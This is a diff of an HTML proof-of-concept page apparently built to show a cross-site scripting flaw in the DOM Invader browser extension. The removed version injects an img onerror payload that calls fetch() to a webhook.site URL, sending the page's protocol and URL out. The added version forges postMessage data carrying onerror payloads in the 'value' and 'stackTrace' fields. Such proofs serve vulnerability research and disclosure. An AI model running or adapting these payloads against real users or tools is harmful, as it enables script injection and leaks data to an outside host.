@@ -1,67 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'nonce-poc2026'; connect-src *; img-src *; style-src 'unsafe-inline';">
-    <title>CSP Protected - Final Test</title>
-    <style>
-        body { background:#0a0a0a; color:#e0e0e0; font-family:'Courier New',monospace; padding:30px; }
-        h1 { color:#00ff88; text-align:center; font-size:1.2em; }
-        .note { background:#1a1a2e; border:1px solid #e74c3c; border-radius:6px; padding:15px; margin:20px 0; font-size:0.85em; line-height:1.7; }
-        .note b { color:#e74c3c; } .note em { color:#f1c40f; font-style:normal; }
-        input { padding:10px; width:300px; background:#111; color:#0f0; border:1px solid #333; font-family:inherit; margin:5px; }
-        button { padding:12px 24px; background:#1a1a2e; color:#00ff88; border:2px solid #00ff88; font-family:inherit; cursor:pointer; border-radius:4px; margin:5px; }
-        button:hover { background:#00ff88; color:#000; }
-        #log { background:#111; border:1px solid #333; border-radius:6px; padding:12px; margin-top:20px; height:250px; overflow-y:auto; font-size:0.8em; line-height:1.8; }
-        .g{color:#2ecc71} .y{color:#f1c40f} .r{color:#e74c3c} .b{color:#3498db}
-        #sink-target { display:none; }
-    </style>
+    <title>DOM Invader PoC - Extension Context Only</title>
 </head>
 <body>
-<h1>[ FINAL TEST — CSP PROTECTED PAGE ]</h1>
-<div class="note">
-    <b>KEY CONCEPT:</b> This page has <em>strict CSP</em> — img onerror will <em>NOT</em> execute here.<br>
-    If DOM Invader re-renders the sink value in DevTools (no CSP there), the payload fires.<br><br>
-    <b>0 webhook requests = No vulnerability</b><br>
-    <b>1 webhook request = VULNERABILITY CONFIRMED</b> (code ran in DevTools context)
-</div>
+    <h1>Click and check DOM Invader tab</h1>
+    <button onclick="trigger()">SEND POSTMESSAGE ONLY</button>
+    <script>
+        function trigger() {
+            const canary = "uitdeeq";
+            const payload = "<img src=x onerror=\"alert('Executed in DOM Invader context')\">" + canary;
 
-<div>
-    <label>DOM Invader Canary (copy from DOM Invader UI):</label><br>
-    <input type="text" id="canary-input" placeholder="e.g. n3b4imp">
-    <button id="trigger-btn">⚡ TRIGGER SINK</button>
-</div>
-<div id="log"></div>
-<div id="sink-target"></div>
-
-<script nonce="poc2026">
-    var WEBHOOK = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
-    var logEl = document.getElementById('log');
-
-    function log(m, c) {
-        logEl.innerHTML += '<div class="'+(c||'b')+'">['+new Date().toLocaleTimeString()+'] '+m+'</div>';
-        logEl.scrollTop = logEl.scrollHeight;
-    }
-
-    document.getElementById('trigger-btn').addEventListener('click', function() {
-        var canary = document.getElementById('canary-input').value.trim();
-        if (!canary) { log('Enter DOM Invader canary first!','r'); return; }
-
-        log('Canary: ' + canary, 'b');
-        log('CSP active — img onerror BLOCKED on this page', 'y');
-
-        var payload = canary + '<img src=x onerror="fetch(\'' + WEBHOOK + '?csp_bypass=1&proto=\'+location.protocol+\'&url=\'+encodeURIComponent(location.href),{mode:\'no-cors\'});alert(\'EXECUTED IN: \'+location.protocol+\'//\'+location.host)">';
-
-        document.getElementById('sink-target').innerHTML = payload;
-
-        log('innerHTML set with payload + canary', 'g');
-        log('CSP should have BLOCKED execution on this page (no alert = correct)', 'y');
-        log('Now: DevTools → DOM Invader → Check Sinks table → Click Stack Trace', 'r');
-        log('If webhook receives request → VULNERABILITY PROVEN', 'r');
-    });
-
-    log('Page loaded with strict CSP: script-src nonce-only', 'b');
-    log('Paste DOM Invader canary and click TRIGGER SINK', 'y');
-</script>
+            // NO innerHTML - only postMessage to the extension
+            window.postMessage({
+                "source": "dom-invader",
+                "type": "augmented-dom",
+                "data": {
+                    "sink": "innerHTML",
+                    "value": payload,
+                    "stackTrace": "<img src=x onerror=\"alert('StackTrace XSS in DevTools')\">"
+                }
+            }, "*");
+        }
+    </script>
 </body>
 </html>
